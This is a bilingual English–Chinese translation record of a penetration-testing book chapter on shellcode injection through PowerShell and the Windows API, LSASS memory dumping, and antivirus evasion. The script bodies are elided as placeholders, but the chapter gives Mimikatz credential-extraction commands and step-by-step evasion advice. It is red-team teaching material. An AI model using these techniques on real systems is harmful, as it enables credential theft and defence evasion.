- en: '*Chapter 12*: Shellcoding – Evading Antivirus'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第12章*：Shell编码 – 规避杀毒软件'
- en: Ever since the Creeper worm made its rounds among PDP-10 mainframe computers
    on the ARPANET in 1971, the sophistication of malware has increased radically.
    Without knowledge of what the future had in store, few people fully understood
    the potential of this newborn beast. One of the pioneers who did understand the
    potential of malware is Fred Cohen, the computer scientist who first defined what
    a computer virus is and also invented the first methodology for combating computer
    viruses. In his seminal 1987 paper *Computer Viruses – Theory and Experiments*,
    Cohen showed that the absolute and precise detection of computer viruses is an
    *undecidable problem* – that is, a problem that requires a yes or no judgment,
    but no system can possibly always give the right answer (or any answer at all).
    He showed the simple relationship between intersystem sharing ability and the
    potential for viral spread. In the years since, the sharing ability of technology
    has reached levels with intergenerational implications, and its full potential
    is likely not yet realized. It is a necessity that the abilities of computer viruses
    mature as well.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 自1971年Creeper蠕虫在ARPANET上PDP-10主机之间传播以来，恶意软件的复杂性已经发生了极大变化。由于对未来充满未知，很少有人完全理解这一新生“怪物”的潜力。理解恶意软件潜力的先驱之一是计算机科学家Fred
    Cohen，他首次定义了计算机病毒的概念，并发明了对抗计算机病毒的首个方法论。在他1987年的开创性论文《计算机病毒——理论与实验》中，Cohen展示了计算机病毒的绝对精确检测是一个*不可判定的问题*——即一个需要做出“是”或“否”判断的问题，但没有任何系统能够始终给出正确答案（甚至任何答案）。他展示了系统间共享能力与病毒传播潜力之间的简单关系。在随后的几年里，技术的共享能力达到了跨代影响的水平，其潜力可能尚未完全被认识到。随着计算机病毒的能力逐渐成熟，这一问题的复杂性同样需要进一步发展。
- en: This background is the origin of what many today call the *cat and mouse problem*
    with computer security. We can’t radically improve one side without assisting
    the other side as well. In the world of penetration testing, this tells us that
    we can never give up hope of evading malware defense mechanisms, and when we are
    successful, we provide our clients with truly cutting-edge information about weaknesses
    in their environments. We’re going to take a look at modern methods of probing
    these defenses as well as how to study the lower layers of abstraction without
    leaving your desk.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 这一背景是今天许多人所称的计算机安全中的*猫捉老鼠问题*的起源。我们无法在不帮助对方的情况下，单方面显著提高其中一方的水平。在渗透测试的世界里，这告诉我们永远不要放弃规避恶意软件防御机制的希望，当我们成功时，我们为客户提供关于他们环境中漏洞的真正前沿信息。我们将探讨现代的防御探测方法，以及如何在不离开办公桌的情况下研究更底层的抽象层。
- en: 'In this chapter, we will cover the following:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下内容：
- en: Using PowerShell and the Windows API to inject shellcode into memory
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用PowerShell和Windows API将Shellcode注入内存
- en: Using PowerShell and the Windows API to steal credentials from memory
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用PowerShell和Windows API从内存中窃取凭证
- en: Disassembly of Windows shellcode executables in Kali
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在Kali中反汇编Windows Shellcode可执行文件
- en: Backdooring Windows executables with custom shellcode
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用自定义Shellcode为Windows可执行文件植入后门
- en: Technical requirements
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'We will require the following prerequisites for testing:'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在测试中需要以下前提条件：
- en: Kali Linux
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux
- en: Windows 10 or 7 VM
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows 10或7虚拟机
- en: Living off the land with PowerShell
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用PowerShell进行离线操作
- en: “You are like a baby. Making noise. Don’t know what to do.”
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: “你就像个婴儿，发出噪音，不知道该做什么。”
- en: – Neytiri in *Avatar*
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: – *阿凡达*中的内蒂莉
- en: So, you have some tasty shellcode, and you need it executed. You could just
    spit out an executable from **msfvenom**, but I don’t think there’s an antivirus
    product in the world that wouldn’t catch that. We’ve also worked with dynamic
    injection with Shellter, and we’ll look at even more parasitizing of innocent
    **Portable Executables** (**PEs**) later in this chapter – but again, we’re putting
    our instructions inside a binary, hoping to sneak past AV after it rules the program
    is safe. Scripts, on the other hand, aren’t machine code. They’re higher-level
    instructions that have to be interpreted – the actual machine code is running
    in the interpreter. It isn’t foolproof by any means, and the AV vendors have been
    on to us scripters for a while now. However, it adds an enticing layer of abstraction
    between the malicious intent and the actual execution.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，你有了一些美味的 shellcode，需要执行它。你可以直接从 **msfvenom** 生成一个可执行文件，但我不认为世界上有任何一个防病毒产品能避免检测到这个。我们也曾使用
    Shellter 进行动态注入，并且在本章后面我们将进一步探讨更多无害的 **便携式可执行文件**（**PEs**）的寄生方式——但再次强调，我们是将指令嵌入到一个二进制文件中，期望在防病毒软件判断程序是安全的情况下偷偷绕过它。另一方面，脚本并不是机器代码。它们是需要被解释的高级指令——实际的机器代码是在解释器中运行的。虽然这并非万无一失，且防病毒供应商早已意识到我们这些脚本编写者的行为，但它在恶意意图和实际执行之间增加了一层诱人的抽象。
- en: Back in my day, we had to drag our toolset over to the target and get to work.
    Kids nowadays have PowerShell running on Windows targets out of the box, and it’s
    capable of interacting with the Windows API as any PE can. It’s opened up a whole
    world of **living off the land** (**LotL**) methods – leveraging resources that
    already exist on the target. This isn’t new – for example, attacking Linux boxes
    has long had the potential for things such as Python to already exist on the target.
    Windows targets can vary, from a sysadmin’s treasure trove of tools down to bare-bones
    embedded systems, so pulling your stuff over to it after gaining that initial
    foothold was a tricky business.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 在我那个时代，我们必须将工具集拖到目标机器上然后开始工作。现在的孩子们，Windows 目标系统上自带 PowerShell，它可以像任何 PE 文件一样与
    Windows API 进行交互。这为 **利用现有资源**（**LotL**）方法开辟了一个全新的世界——利用目标上已经存在的资源。这并不新鲜——例如，攻击
    Linux 主机早就有了像 Python 这样的工具可以在目标机器上存在的潜力。Windows 目标系统的情况差异很大，从系统管理员的工具宝库到简单的嵌入式系统都有，因此在获得初步立足点后，把你的工具搬过去可是件很麻烦的事。
- en: The core concept here is that the interpreter *already* exists, and any defense
    software knows it’s *not* malware. Don’t be fooled into thinking this means a
    free reign of your digital terror – as stated elsewhere in this book, the defense
    is *not* stupid. They are well aware of this vector, and endpoint protection products
    vary in their success in catching these methods. In today’s age, there has been
    a rapid improvement in detection even in the event that an action isn’t blocked
    – you may pull off a malicious PowerShell execution and think you’re golden, but
    a defense analyst is already reviewing your activity by the time you even begin
    fetching loot. You should always understand your target environment and plan accordingly.
    Recall from [*Chapter 1*](B17616_01_Final_VK_ePub.xhtml#_idTextAnchor014), *Open
    Source Intelligence*, the value of open source intelligence and the possibility
    that someone working for your client has already been on vendor forums asking
    for help. You may already have a lead as to what your defense looks like. Are
    they running McAfee? Then you need to investigate your attack in an isolated McAfee
    environment. Maybe an attack that would be flagged by 80% of vendors would be
    missed in your target environment. And what if your attack *is* flagged in your
    test environment? Try making some changes. It’s amazing how, even in today’s age
    of sophisticated attacks, some vendors will initially stop a script but then allow
    it after a change to some variable names.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 这里的核心概念是解释器*已经*存在，并且任何防御软件都知道它*不是*恶意软件。不要被误导认为这意味着你的数字恐怖活动可以自由进行——正如本书其他地方所述，防御并*不*愚蠢。他们非常清楚这个攻击途径，终端保护产品在捕获这些方法上的成功率各不相同。在今天的时代，即使某个行为没有被阻止，检测技术也已经有了快速的提升——你可能成功执行了恶意
    PowerShell 命令，并以为自己安全无虞，但在你开始获取战利品之前，防御分析师已经在审查你的活动了。你应该始终了解你的目标环境，并相应地制定计划。回想一下[*第一章*](B17616_01_Final_VK_ePub.xhtml#_idTextAnchor014)，*开放源代码情报*，开放源代码情报的价值以及你的客户中有人可能已经在供应商论坛上寻求帮助的可能性。你或许已经能获得有关防御情况的线索。它们使用
    McAfee 吗？那么你需要在一个隔离的 McAfee 环境中调查你的攻击。也许在80%的供应商中会被标记的攻击在你的目标环境中就会被忽视。那么如果你的攻击*在*测试环境中被标记了呢？尝试进行一些修改。令人惊讶的是，即使在今天这个攻击手段复杂的时代，一些供应商会最初阻止一个脚本，但在修改了一些变量名后又允许它运行。
- en: With all of this philosophy out of the way, let’s take a look at a couple of
    ways you might be able to conduct some surprising attacks with PowerShell on your
    target – no downloads required.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 讲完这些哲学性话题后，让我们来看看你可能如何在目标上使用 PowerShell 发起一些意想不到的攻击——无需下载任何文件。
- en: Injecting Shellcode into interpreter memory
  id: totrans-19
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 注入 Shellcode 到解释器内存
- en: As some famous person once said, “Ask not what PowerShell can do for you; ask
    what you can do with the native Windows API.” Well, okay, no famous person said
    that, but it’s good advice. PowerShell is merely our bridge to the ability to
    import native API functions and leverage their power. In this case, we’re going
    to call functions inside **kernel32.dll** and **msvcrt.dll**. We need **kernel32.dll**
    to reserve memory for our use and start a new thread inside that reserved space;
    then, we use **msvcrt.dll** (the C runtime library) so that we can set each position
    in the reserved space with a specific character – in our case, each byte of shellcode.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 正如某位名人曾经说过，“不要问 PowerShell 能为你做什么，而是问你能用 Windows 原生 API 做什么。” 好吧，好像没有哪个名人说过这句话，但这是个不错的建议。PowerShell
    只是我们连接原生 API 函数并利用其功能的桥梁。在这种情况下，我们将调用 **kernel32.dll** 和 **msvcrt.dll** 中的函数。我们需要
    **kernel32.dll** 来为我们的使用保留内存并在这段保留的空间内启动一个新线程；然后，我们使用 **msvcrt.dll**（C 运行时库），以便我们可以用特定字符设置保留空间中的每个位置——在我们这个案例中，就是将每个字节的位置填充为
    shellcode。
- en: 'First, we’ll define the functions with C# signatures; these will be stored
    in a variable called **$signatures**. Then, we use **Add-Type** to bring them
    into our PowerShell session. Let’s take a look:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将用 C# 签名定义函数；这些函数将存储在名为 **$signatures** 的变量中。然后，我们使用 **Add-Type** 将它们引入我们的
    PowerShell 会话。我们来看看：
- en: '[PRE0]'
  id: totrans-22
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: '[PRE1]'
  id: totrans-23
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '[PRE2]'
  id: totrans-24
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: '[PRE3]'
  id: totrans-25
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: Okay, that wasn’t too painful. We create the **$signatures** variable, and inside
    of it is the code that brings in the three functions we need from the two DLLs.
    Finally, we create an object called **$functionImport** that now contains these
    functions. From this point on, we merely need to interact with **$functionImport**
    to call those functions.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 好的，这并没有那么痛苦。我们创建了 **$signatures** 变量，并且在其中包含了将两个 DLL 中的三个函数引入的代码。最后，我们创建了一个名为
    **$functionImport** 的对象，它现在包含了这些函数。从这时起，我们只需要与 **$functionImport** 交互来调用这些函数。
- en: 'Now, we need to create a byte array called **$shellcode**. This will contain
    each byte of our payload, and we’ll use a **For** loop to reference each element
    in order:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们需要创建一个名为**$shellcode**的字节数组。这个数组将包含我们有效负载的每个字节，我们将使用**For**循环来依次引用每个元素：
- en: '[PRE4]'
  id: totrans-28
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: '[PRE5]'
  id: totrans-29
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: '[PRE6]'
  id: totrans-30
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'Note that we tell **VirtualAlloc()** the exact size of our shellcode. What
    about the other parameters? As you break this down (and any other code you find
    in your career), pay attention to how we defined this in the first place: **IntPtr
    lpAddress, uint dwSize, uint flAllocationType, uint flProtect**. This tells us
    that **VirtualAlloc()** will expect, in order, an address, a size, an allocation
    type, and the kind of memory protection to be used in the allocated space. As
    always, I encourage you to jump into the finer details outside of these pages.'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我们告诉**VirtualAlloc()**精确的shellcode大小。其他参数呢？在你解析这段代码（以及你未来在职业生涯中遇到的其他代码）时，注意我们最初是如何定义这些参数的：**IntPtr
    lpAddress, uint dwSize, uint flAllocationType, uint flProtect**。这告诉我们，**VirtualAlloc()**将按顺序期待一个地址、一个大小、一个分配类型以及分配空间中将使用的内存保护类型。像往常一样，我鼓励你跳出这些页面，深入了解更多细节。
- en: 'Our penultimate step is to use **memset()** to set each position of our allocated
    space with a character from our shellcode. As you can imagine, this is best accomplished
    with a **For** loop. We’ll declare a counter called **$position** and, as it increments,
    **memset()** set the corresponding byte in the allocated space, using **$position**
    as an offset to **$allocSpace** to identify the exact location:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的倒数第二步是使用**memset()**将我们分配空间的每个位置设置为来自shellcode的一个字符。正如你能想象的那样，最佳的实现方式是使用**For**循环。我们将声明一个名为**$position**的计数器，并随着它的递增，**memset()**会将相应的字节设置到分配空间中，使用**$position**作为偏移量，结合**$allocSpace**来确定确切的位置：
- en: '[PRE7]'
  id: totrans-33
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: '[PRE8]'
  id: totrans-34
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '[PRE9]'
  id: totrans-35
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: The trap is set. We merely need to execute it. As you’ll recall from when we
    defined **$signatures**, the third parameter passed to **CreateThread()** is the
    starting address – in this case, **$allocSpace**. Finally, to keep our process
    running while our new naughty thread runs, we use **While ($true)** to create
    an endless sleep. Perchance to dream?
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 陷阱已设下。我们只需要执行它。正如你从我们定义**$signatures**时记得的，传递给**CreateThread()**的第三个参数是起始地址——在这个例子中就是**$allocSpace**。最后，为了在新线程运行时保持进程的持续运行，我们使用**While
    ($true)**来创建一个无限休眠。或许有一天会做个美梦？
- en: '[PRE10]'
  id: totrans-37
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '[PRE11]'
  id: totrans-38
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: '[PRE12]'
  id: totrans-39
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: '[PRE13]'
  id: totrans-40
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'In all of our excitement, we almost forgot to generate the shellcode! Of course,
    the possibilities are endless. For our demonstration, let’s just generate a quick
    message-box chunk of shellcode with **msfvenom**:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们兴奋的过程中，差点忘了生成shellcode！当然，可能性是无穷的。为了演示，我们就生成一段快速的消息框shellcode，使用**msfvenom**：
- en: '![Figure 12.1 – Generating the payload in the PowerShell byte format ](image/Figure_12.01_B17616.jpg)'
  id: totrans-42
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.1 – 在PowerShell字节格式中生成有效负载](image/Figure_12.01_B17616.jpg)'
- en: Figure 12.1 – Generating the payload in the PowerShell byte format
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.1 – 在PowerShell字节格式中生成有效负载
- en: 'The always helpful **msfvenom** spits out the result in PowerShell format and
    calls it **$buf**. You can copy and paste the bytes alone or just rename the variable.
    When I fire this off in my Windows 10 lab, the console prints each address location
    as the **For** loop does its work with **memset()**. At the end, we see the shellcode
    is successfully launched:'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 永远有用的**msfvenom**会输出结果为PowerShell格式并将其命名为**$buf**。你可以单独复制并粘贴字节，或者只需重命名变量。当我在我的Windows
    10实验室中运行这段代码时，控制台会在**For**循环使用**memset()**时打印每个地址位置。最后，我们看到shellcode成功执行：
- en: '![Figure 12.2 – The executed payload ](image/Figure_12.02_B17616.jpg)'
  id: totrans-45
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.2 – 执行的有效负载](image/Figure_12.02_B17616.jpg)'
- en: Figure 12.2 – The executed payload
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.2 – 执行的有效负载
- en: Note that there are related functions called **VirtualAllocEx()** and **CreateRemoteThread()**.
    What’s the difference here? Those would accomplish the same thing but in *another*
    process’s memory. By using these functions here, the PowerShell interpreter is
    allocating the space in its own memory and starting a new thread under its own
    process. In keeping with our mantra, *the defense isn’t dumb*, there are many
    ways to catch this behavior. However, it’s extremely difficult to keep up with
    all of the variations, and some vendors, even today, are still relying on old
    methods. Keep a flexible mind!
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，还有一些相关的函数叫做**VirtualAllocEx()**和**CreateRemoteThread()**。它们有什么区别呢？这两个函数实现的效果是一样的，只不过是作用于*另一个*进程的内存。通过在这里使用这些函数，PowerShell解释器正在它自己的内存中分配空间并在自己的进程下启动一个新线程。秉持着我们的口号，*防御不可傻*，有很多方法可以捕捉到这种行为。然而，要跟上所有变化是非常困难的，而且有些厂商直到今天仍然依赖旧的方法。保持灵活的思维！
- en: Getting sassy – on-the-fly LSASS memory dumping with PowerShell
  id: totrans-48
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 挑战自我 – 使用PowerShell进行即时LSASS内存转储
- en: Let’s roll with the theme of using PowerShell to interact with the Windows API
    in real time. This time, we aren’t going to inject anything; we want to attack
    the **Local Security Authority Server Service** (**LSASS**) using Windows’ native
    debugging abilities. This kind of behavior *should* be blocked, but we’ve found
    that in certain configurations with certain AV vendors, this still works.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们继续使用 PowerShell 与 Windows API 进行实时交互的主题。这一次，我们不打算注入任何内容；我们要使用 Windows 本地的调试功能来攻击
    **本地安全授权服务器服务** (**LSASS**)。这种行为 *应该* 被拦截，但我们发现，在某些配置和某些 AV 供应商的情况下，这仍然有效。
- en: War Stories – a Real-World Attack Scenario
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 战争故事 – 一个真实的攻击场景
- en: I was recently part of a red team assessment inside a predominately Windows
    10 environment. One of the team members had written up a gorgeous tool that leverages
    a Windows native memory dumping method to dump LSASS and then invoke Mimikatz
    to extract credentials. It was working until, one day, the endpoint protection
    software got an update and started blocking it. A couple of weeks later, I was
    working on a host that had the popular remote control software VNC installed with
    a weak password and the Windows session was left unlocked. Thus, I could virtually
    sit down at the keyboard. I wrote out a PowerShell version of the same tool and
    then hosted the text as a webpage. Using a browser on the target PC, I visited
    the page, copied the text of the PowerShell script, pasted it inside a PowerShell
    session, and hit enter. It worked! I had a dump of LSASS memory, and I didn’t
    need to download anything.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 最近，我参与了一次主要基于 Windows 10 环境的红队评估。团队中的一位成员编写了一个精妙的工具，利用 Windows 本地的内存转储方法来转储
    LSASS 内存，并调用 Mimikatz 提取凭证。这个工具一直都能正常工作，直到有一天，终端保护软件更新了，开始拦截它。几周后，我在一台安装了流行远程控制软件
    VNC、且密码较弱的主机上工作，而 Windows 会话也保持解锁状态。因此，我可以虚拟地坐到键盘前。我写出了同样工具的 PowerShell 版本，然后将文本托管为一个网页。通过目标
    PC 上的浏览器，我访问了该页面，复制了 PowerShell 脚本的文本，将其粘贴到 PowerShell 会话中并按下回车。它成功了！我得到了 LSASS
    内存的转储，而且不需要下载任何东西。
- en: 'This is a pretty quick write-up, and once you get used to it, you’ll be able
    to shave off some lines. Similar to our memory injection attack, we are leveraging
    native methods. In this case, we are leveraging **MiniDumpWriteDump()**, a function
    that creates a minidump file for us. We can specify the process to be dumped,
    so let’s see what happens when we try it with the LSASS process. Let’s get started:'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 这篇写得很简短，一旦你习惯了，就能省去一些代码行。和我们的内存注入攻击类似，我们正在利用本地方法。在这种情况下，我们使用了 **MiniDumpWriteDump()**，这是一个为我们创建小转储文件的函数。我们可以指定要转储的进程，那么让我们看看当我们尝试对
    LSASS 进程进行操作时会发生什么。开始吧：
- en: '[PRE14]'
  id: totrans-53
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: '[PRE15]'
  id: totrans-54
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: '[PRE16]'
  id: totrans-55
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: '[PRE17]'
  id: totrans-56
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: So far, so good. We’re pulling in **WindowsErrorReporting**, which allows us
    to figure out what went wrong when something crashes. Essentially, we want to
    be able to investigate LSASS the same way we’d investigate an ordinary **blue
    screen of death** (**BSoD**) crash. Of the methods available to us, we want **MiniDumpWriteDump()**.
    Now, we need to define the target process and a destination for our dump file.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，一切顺利。我们引入了 **WindowsErrorReporting**，它允许我们在某些崩溃发生时找出问题所在。本质上，我们希望能够像调查普通的
    **蓝屏死机** (**BSoD**) 崩溃一样，调查 LSASS。在我们可以使用的各种方法中，我们选择了 **MiniDumpWriteDump()**。现在，我们需要定义目标进程以及转储文件的目的地。
- en: '[PRE18]'
  id: totrans-58
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: '[PRE19]'
  id: totrans-59
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: '[PRE20]'
  id: totrans-60
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: '[PRE21]'
  id: totrans-61
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: '[PRE22]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: '[PRE23]'
  id: totrans-63
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'As you can imagine, we can target any process we please. On a recent assessment,
    I gained access to a SCADA device and used this very script to dump the memory
    from the proprietary client managing the industrial process. We declare variables
    for each property of **$lsass** and define the destination for our dump file –
    the local desktop:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所想，我们可以针对任何我们想要的进程。在一次评估中，我获得了对 SCADA 设备的访问，并使用这段脚本从管理工业过程的专有客户端中转储了内存。我们为
    **$lsass** 的每个属性声明了变量，并定义了转储文件的目标位置——本地桌面：
- en: '[PRE24]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: '[PRE25]'
  id: totrans-66
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: '[PRE26]'
  id: totrans-67
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: '[PRE27]'
  id: totrans-68
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: '[PRE28]'
  id: totrans-69
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: '[PRE29]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: '[PRE30]'
  id: totrans-71
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: '[PRE31]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: '[PRE32]'
  id: totrans-73
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: '[PRE33]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: '[PRE34]'
  id: totrans-75
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: '[PRE35]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: '[PRE36]'
  id: totrans-77
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: '[PRE37]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: '[PRE38]'
  id: totrans-79
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: '[PRE39]'
  id: totrans-80
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: '[PRE40]'
  id: totrans-81
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: '[PRE41]'
  id: totrans-82
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: Finally, the meat and potatoes of our operation. We’ve created a **FileStream**
    object, which we’ll reference when calling **MiniDumpWriteDump()**. It points
    at the desktop file location we just specified. For our convenience, we have some
    error handling in case we have any problems along the way, but you don’t need
    this part. If this works, you’ll see a beefy file called **pirate_booty.dmp**
    on the desktop. We’re dumping LSASS, so in theory, it should be a nice fat pile
    of megabytes. If you see no failures but a zero-length file, it didn’t work.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 最后是我们操作的核心部分。我们创建了一个 **FileStream** 对象，当调用 **MiniDumpWriteDump()** 时会引用它。它指向我们刚刚指定的桌面文件位置。为了方便起见，我们还加入了一些错误处理，以防途中遇到问题，但这部分你不需要。如果操作成功，你会在桌面看到一个名为
    **pirate_booty.dmp** 的大文件。我们正在转储 LSASS，因此理论上它应该是一个庞大的兆字节文件。如果你没有看到失败，但文件大小为零，那就表示没有成功。
- en: 'What’s nice about this attack is we’re merely collecting a dump file; we aren’t
    worried about Mimikatz being detected by antivirus because it’s back on our attack
    box. The only requirement at this point is getting the dump file back from the
    target. Once our goodies are in hand, we invoke Mimikatz and pass just two commands
    to force a local file analysis:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 这次攻击的好处在于，我们仅仅是收集一个转储文件；我们不担心 Mimikatz 被杀毒软件检测到，因为它已经回到我们的攻击主机。此时唯一的要求是将转储文件从目标机器拿回来。一旦我们得到了有用的文件，我们调用
    Mimikatz 并传递两个命令来强制进行本地文件分析：
- en: 'mimikatz # sekurlsa::minidump <file name>'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 'mimikatz # sekurlsa::minidump <文件名>'
- en: 'mimikatz # sekurlsa::logonPasswords'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 'mimikatz # sekurlsa::logonPasswords'
- en: 'Allow your eyes to glisten as you relish the treasure before you, such as Charlie
    when he first glimpses the golden ticket in his chocolate bar. Keep in mind, we’re
    seeing a dump from LSASS running in real time, so there may be cached domain credentials
    that we *won’t* see here. The bonus is that whatever we do find here is proven
    to be up to date:'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 让你的眼睛闪烁，享受眼前的宝藏，就像查理第一次看到巧克力棒里的金色票券时的表情。请记住，我们看到的是实时运行的 LSASS 转储，因此这里可能有缓存的域凭证，我们*无法*看到。额外的好处是，无论我们在这里找到什么，都是最新的：
- en: '![Figure 12.3 – Extracting credentials from the LSASS dump with Mimikatz ](image/Figure_12.03_B17616.jpg)'
  id: totrans-88
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.3 – 使用 Mimikatz 从 LSASS 转储中提取凭证](image/Figure_12.03_B17616.jpg)'
- en: Figure 12.3 – Extracting credentials from the LSASS dump with Mimikatz
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.3 – 使用 Mimikatz 从 LSASS 转储中提取凭证
- en: You can use this information for your lateral movement efforts – for example,
    dumping the hash from here into the **PASSWORD** field in the **PSEXEC** module
    in Metasploit. I can hear you asking at this point, “Surely it isn’t *this* easy?”
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以将这些信息用于横向移动——例如，将这里提取的哈希值放入 Metasploit 的 **PSEXEC** 模块中的 **PASSWORD** 字段。我能听到你此刻在问，“难道这就*这么简单*吗？”
- en: Staying flexible – tweaking the scripts
  id: totrans-91
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 保持灵活 —— 调整脚本
- en: If you typed these out verbatim and launched them inside your fresh installation
    of Windows 10, you probably ran into issues with Defender. The most important
    thing to remember about AV is that it isn’t any single product or single strategy;
    there are many vendors with their own proprietary methods. They can also have
    their own unique oversights. For example, suppose a corporation reports a false
    negative to their AV vendor via their contractual support agreement. It’s not
    uncommon for the vendor to grab the SHA256 fingerprint of the reported file and
    simply add it to the next round of signatures, which means you only need to change
    a single character in the source to get an *unknown* program.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你照字面输入这些命令，并在刚安装的 Windows 10 上运行，可能会遇到 Defender 的问题。关于杀毒软件（AV）最重要的一点是，它并不是某一个单一的产品或策略；有许多供应商使用各自的专有方法，它们也可能有自己的独特忽视之处。例如，假设一个公司通过他们的合同支持协议向杀毒软件供应商报告了一个假阴性（即没有检测到的病毒）。供应商通常会抓取报告文件的
    SHA256 指纹，并将其加入下一个版本的病毒库签名中，这意味着你只需要改变源代码中的一个字符，就可以得到一个*未知的*程序。
- en: 'Sometimes, it’s as simple as adding comments – they don’t change the behavior
    of the program at all, but adding them puts in a bunch of extra information. You
    can even change variable names:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
